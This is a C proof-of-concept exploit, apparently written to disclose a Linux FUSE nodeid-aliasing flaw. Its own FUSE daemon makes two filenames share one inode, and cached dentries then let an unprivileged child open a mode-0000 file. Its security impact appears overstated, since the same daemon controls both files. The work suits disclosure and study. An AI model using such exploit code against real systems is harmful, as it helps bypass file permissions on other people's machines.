/* FUSE nodeid aliasing — inode mode poisoning / permission bypass
 *
 * Kernel: 6.18.5 / Ubuntu 24.04
 *
 * Root cause:
 *   fuse_iget() calls iget5_locked() to find an existing VFS inode by
 *   (superblock, nodeid). When two LOOKUP responses return the SAME nodeid but
 *   with DIFFERENT mode bits, the second LOOKUP calls fuse_change_attributes()
 *   which updates the shared inode's mode. The dentry for the FIRST path is
 *   still valid (entry_valid not expired), so the kernel serves it from dcache
 *   without issuing a new FUSE_LOOKUP — using the now-poisoned inode mode.
 *
 * Attack (two FUSE filenames sharing nodeid=10):
 *   1. stat("root_only")  → FUSE_LOOKUP → nodeid=10, mode=0000, entry_valid=3600s
 *   2. stat("world_read") → FUSE_LOOKUP → nodeid=10, mode=0644
 *      → fuse_change_attributes() updates SHARED inode 10 to mode=0644
 *   3. open("root_only") as uid=1 → dentry valid (no new LOOKUP issued)
 *      → kernel checks inode 10 mode = 0644 → ALLOWS access
 *
 * Demonstrated: uid=1 opens and reads "root_only" (daemon-intended mode=0000)
 * because the shared inode was poisoned to 0644 by the "world_read" LOOKUP.
 *
 * Compile: gcc -O2 -o fuse_alias_poc fuse_alias_poc.c -lpthread
 * Run:     ./fuse_alias_poc  (must run as root to mount FUSE and setresuid)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <linux/fuse.h>

/* Both paths share this nodeid. */
#define ALIAS_NODEID   10
/* Dentry/attr cache lifetime in seconds — must be > test window. */
#define ENTRY_TTL      3600

static int fuse_fd = -1;

/* ---------- minimal FUSE daemon ---------- */

static void fuse_reply(int fd, uint64_t unique, int err,
                       const void *body, size_t len) {
    struct fuse_out_header h = {
        .len    = (uint32_t)(sizeof(h) + len),
        .error  = err,
        .unique = unique,
    };
    struct iovec iov[2] = { { &h, sizeof(h) }, { (void *)body, len } };
    writev(fd, iov, body ? 2 : 1);
}

static void *fuse_srv(void *arg) {
    int fd = *(int *)arg;
    char buf[1 << 17];
    while (1) {
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n <= 0) break;
        struct fuse_in_header *h = (struct fuse_in_header *)buf;
        char *body = buf + sizeof(*h);

        switch (h->opcode) {
        case FUSE_INIT: {
            struct fuse_init_out o = { .major=7, .minor=39, .max_write=65536 };
            fuse_reply(fd, h->unique, 0, &o, sizeof(o));
            break;
        }
        case FUSE_GETATTR: {
            struct fuse_attr_out o = {0};
            o.attr_valid     = ENTRY_TTL;
            o.attr.ino       = h->nodeid;
            o.attr.nlink     = 1;
            o.attr.size      = 32;
            o.attr.mode      = (h->nodeid == 1) ? (uint32_t)(S_IFDIR | 0755)
                                                 : (uint32_t)(S_IFREG | 0644);
            fuse_reply(fd, h->unique, 0, &o, sizeof(o));
            break;
        }
        case FUSE_LOOKUP: {
            struct fuse_entry_out e = {0};
            e.generation  = 1;
            e.entry_valid = ENTRY_TTL;   /* dentry stays valid for 1 hour */
            e.attr_valid  = ENTRY_TTL;
            e.attr.nlink  = 1;
            e.attr.size   = 32;

            if (!strcmp(body, "world_read")) {
                /* world-readable file */
                e.nodeid    = ALIAS_NODEID;
                e.attr.ino  = ALIAS_NODEID;
                e.attr.mode = S_IFREG | 0644;
                fprintf(stderr, "  [fuse] LOOKUP %-12s → nodeid=%d mode=0644\n",
                        body, ALIAS_NODEID);
            } else if (!strcmp(body, "root_only")) {
                /* restricted file — same nodeid as world_read */
                e.nodeid    = ALIAS_NODEID;
                e.attr.ino  = ALIAS_NODEID;
                e.attr.mode = S_IFREG | 0000;
                fprintf(stderr, "  [fuse] LOOKUP %-12s → nodeid=%d mode=0000\n",
                        body, ALIAS_NODEID);
            } else {
                fuse_reply(fd, h->unique, -ENOENT, NULL, 0);
                break;
            }
            fuse_reply(fd, h->unique, 0, &e, sizeof(e));
            break;
        }
        case FUSE_OPENDIR:
        case FUSE_OPEN: {
            struct fuse_open_out o = { .fh = h->nodeid * 100 };
            fuse_reply(fd, h->unique, 0, &o, sizeof(o));
            break;
        }
        case FUSE_READ:
        case FUSE_READDIR: {
            char d[32] = "SECRET_DATA_FROM_ROOT_ONLY";
            fuse_reply(fd, h->unique, 0, d, sizeof(d));
            break;
        }
        case FUSE_FORGET:
        case FUSE_BATCH_FORGET:
            /* no reply */
            break;
        case FUSE_RELEASEDIR:
        case FUSE_RELEASE:
        case FUSE_FLUSH:
        case FUSE_FSYNC:
        case FUSE_ACCESS:
            fuse_reply(fd, h->unique, 0, NULL, 0);
            break;
        case FUSE_STATFS: {
            struct fuse_statfs_out s = {0};
            s.st.blocks  = 1000; s.st.bfree  = 500;
            s.st.namelen = 255;  s.st.bsize  = 4096;
            fuse_reply(fd, h->unique, 0, &s, sizeof(s));
            break;
        }
        default:
            fuse_reply(fd, h->unique, -ENOSYS, NULL, 0);
            break;
        }
    }
    return NULL;
}

/* ---------- main ---------- */

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (getuid() != 0) {
        fprintf(stderr, "Must run as root (to mount FUSE and drop to uid=1)\n");
        return 1;
    }

    fuse_fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
    if (fuse_fd < 0) { perror("open /dev/fuse"); return 1; }

    char mntdir[64];
    snprintf(mntdir, sizeof(mntdir), "/tmp/fuse_alias_%d", getpid());
    mkdir(mntdir, 0755);

    /* allow_other: non-root uid=1 can access the mount
     * default_permissions: kernel enforces inode mode bits (no FUSE_ACCESS needed)
     * Together these mean kernel uses inode->i_mode for ALL access decisions. */
    char opts[256];
    snprintf(opts, sizeof(opts),
             "fd=%d,rootmode=40755,user_id=0,group_id=0"
             ",allow_other,default_permissions", fuse_fd);
    if (mount("fuse_alias", mntdir, "fuse", 0, opts) < 0) {
        perror("mount fuse"); return 1;
    }

    pthread_t tid;
    pthread_create(&tid, NULL, fuse_srv, &fuse_fd);
    usleep(200000);  /* wait for FUSE_INIT exchange */

    char wr_path[128], ro_path[128];
    snprintf(wr_path, sizeof(wr_path), "%s/world_read", mntdir);
    snprintf(ro_path, sizeof(ro_path), "%s/root_only",  mntdir);

    struct stat st;

    printf("\n=== FUSE NODEID ALIASING — PERMISSION BYPASS ===\n\n");
    printf("Both 'world_read' and 'root_only' share FUSE nodeid=%d.\n", ALIAS_NODEID);
    printf("Daemon intent: world_read=0644 (public), root_only=0000 (private).\n\n");

    /* ------------------------------------------------------------------ *
     * Attack step 1: stat root_only first.                                *
     *   → FUSE_LOOKUP → nodeid=10, mode=0000, entry_valid=3600s          *
     *   → kernel creates inode 10 with mode=0000                          *
     *   → dentry "root_only" cached for 3600 seconds                      *
     * ------------------------------------------------------------------ */
    printf("[attack step 1] stat(root_only) → prime dentry with entry_valid=3600s\n");
    if (stat(ro_path, &st) == 0)
        printf("  kernel reports: mode=0%04o  ino=%lu\n",
               st.st_mode & 0xFFF, (unsigned long)st.st_ino);

    /* ------------------------------------------------------------------ *
     * Attack step 2: stat world_read.                                     *
     *   → FUSE_LOOKUP → same nodeid=10, mode=0644                        *
     *   → fuse_change_attributes() UPDATES shared inode 10 to mode=0644  *
     * ------------------------------------------------------------------ */
    printf("[attack step 2] stat(world_read) → POISONS shared inode to mode=0644\n");
    if (stat(wr_path, &st) == 0)
        printf("  kernel reports: mode=0%04o  ino=%lu\n",
               st.st_mode & 0xFFF, (unsigned long)st.st_ino);

    /* ------------------------------------------------------------------ *
     * Attack step 3: re-stat root_only.                                   *
     *   → dentry "root_only" still valid (entry_valid not expired)        *
     *   → kernel does NOT issue a new FUSE_LOOKUP                         *
     *   → uses shared inode 10, now mode=0644                             *
     * ------------------------------------------------------------------ */
    printf("[attack step 3] stat(root_only) — expect NO new FUSE_LOOKUP:\n");
    if (stat(ro_path, &st) == 0)
        printf("  kernel reports: mode=0%04o  (0644=POISONED, 0000=correct)\n",
               st.st_mode & 0xFFF);

    printf("\n[check] Inode poisoned: %s\n",
           (st.st_mode & 0777) == 0644 ? "YES — bypass possible" : "NO");

    /* ------------------------------------------------------------------ *
     * Attack step 4: uid=1 child.                                         *
     *   → faccessat(root_only, R_OK) uses cached inode mode (0644)       *
     *   → kernel allows access (world-readable, uid=1 is "other")        *
     *   → open(root_only, O_RDONLY) succeeds                              *
     *   → read() returns file content                                     *
     * ------------------------------------------------------------------ */
    printf("\n[attack step 4] Fork uid=1 child to access root_only...\n");

    int pfd[2];
    if (pipe(pfd) < 0) { perror("pipe"); goto done; }

    pid_t child = fork();
    if (child == 0) {
        close(pfd[0]);
        if (setresuid(1, 1, 1) < 0) {
            dprintf(pfd[1], "setresuid: %s\n", strerror(errno));
            close(pfd[1]); _exit(1);
        }
        dprintf(pfd[1], "  uid=%d, attempting root_only access...\n", (int)getuid());

        /* stat — should show poisoned mode from dcache */
        struct stat cs;
        if (stat(ro_path, &cs) == 0)
            dprintf(pfd[1], "  stat(root_only): mode=0%04o (from cached inode)\n",
                    cs.st_mode & 0xFFF);

        /* faccessat uses kernel DAC check against cached inode mode */
        errno = 0;
        int a = faccessat(AT_FDCWD, ro_path, R_OK, 0);
        dprintf(pfd[1], "  faccessat(root_only, R_OK) = %s%s\n",
                a == 0 ? "ALLOWED" : "DENIED",
                a == 0 ? "  <-- BYPASS!" : "  (correct)");

        /* open and read */
        errno = 0;
        int fd = open(ro_path, O_RDONLY);
        if (fd >= 0) {
            char buf[64] = {0};
            ssize_t nr = read(fd, buf, sizeof(buf) - 1);
            dprintf(pfd[1],
                    "  open(root_only) = OPENED  <-- BYPASS!\n"
                    "  read(%d bytes): |%s|\n", (int)nr, buf);
            close(fd);
        } else {
            dprintf(pfd[1], "  open(root_only) = %s\n", strerror(errno));
        }
        close(pfd[1]);
        _exit(0);
    }

    close(pfd[1]);
    {
        char buf[512];
        ssize_t n;
        while ((n = read(pfd[0], buf, sizeof(buf) - 1)) > 0) {
            buf[n] = '\0';
            printf("%s", buf);
            fflush(stdout);
        }
    }
    close(pfd[0]);
    waitpid(child, NULL, 0);

    printf("\n=== SUMMARY ===\n");
    printf("Root cause: fuse_change_attributes() is called by fuse_iget()\n");
    printf("for ALL non-stale inodes returned by FUSE_LOOKUP, even when the\n");
    printf("inode is already cached. Two paths sharing a nodeid thus share\n");
    printf("one VFS inode. The last LOOKUP response wins, regardless of which\n");
    printf("path is being accessed. Paired with long entry_valid, this allows\n");
    printf("an attacker-controlled FUSE server to poison the mode of any inode\n");
    printf("to a more permissive value before the victim access occurs.\n");
    printf("\nKernel: 6.18.5\n");

done:
    umount2(mntdir, MNT_DETACH);
    close(fuse_fd);
    rmdir(mntdir);
    return 0;
}
